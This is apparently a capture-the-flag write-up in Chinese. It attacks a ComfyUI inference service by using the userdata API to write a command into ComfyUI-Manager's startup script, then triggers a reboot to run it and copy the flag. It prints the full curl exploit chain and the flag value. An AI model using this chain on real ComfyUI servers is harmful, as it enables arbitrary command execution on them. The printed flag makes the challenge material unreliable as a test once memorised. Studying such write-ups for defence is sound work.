> 请对目标AI推理服务进行安全测试与漏洞挖掘。

## 题解

### 入口与指纹

8188 上是 ComfyUI。`GET /system_stats` 的版本是 `0.9.2`，前端是 `1.36.14`，PyTorch 是 `2.10.0`。同进程加载了 ComfyUI-Manager `V3.37`，版本接口是 `GET /api/manager/version`。自定义节点只有 `websocket_image_save.py`。

### 关键观察

用户数据可以写到 `/ComfyUI/user/default/`。Manager 在每次进程启动时读取 `ComfyUI-Manager/startup-scripts/install-scripts.txt`。文件里每一行是一个 Python 列表：第一项必须是已经存在的目录，后面是要执行的命令。`GET /api/manager/reboot` 会让当前进程重新拉起，从而跑这份脚本。脚本跑完后文件会被删掉。

`/view` 和 userdata 的路径检查都不允许直接读 `/challenge/flag.txt`。

### 利用链

把一行复制命令写进启动脚本，然后重启：

```bash
T=$(head -1 .target)
ENC=$(python3 -c 'import urllib.parse; print(urllib.parse.quote("ComfyUI-Manager/startup-scripts/install-scripts.txt", safe=""))')
curl -sS -X POST -H 'Content-Type: text/plain' \
  --data-binary '["/bin", "/bin/sh", "-c", "cp /challenge/flag.txt /ComfyUI/user/default/got_flag.txt"]' \
  "http://$T/api/userdata/${ENC}?overwrite=true"
curl -sS "http://$T/api/manager/reboot"
# 等 8188 重新应答
curl -sS "http://$T/api/userdata/got_flag.txt"
```

本次正文是 `flag{b8b477e4-0f35-4a1e-9a2f-7326047f11bb}`。平台接受。

### flag 位置

原文件是 `/challenge/flag.txt`。启动脚本把它复制到用户目录的 `got_flag.txt`，再由 userdata 接口读出。
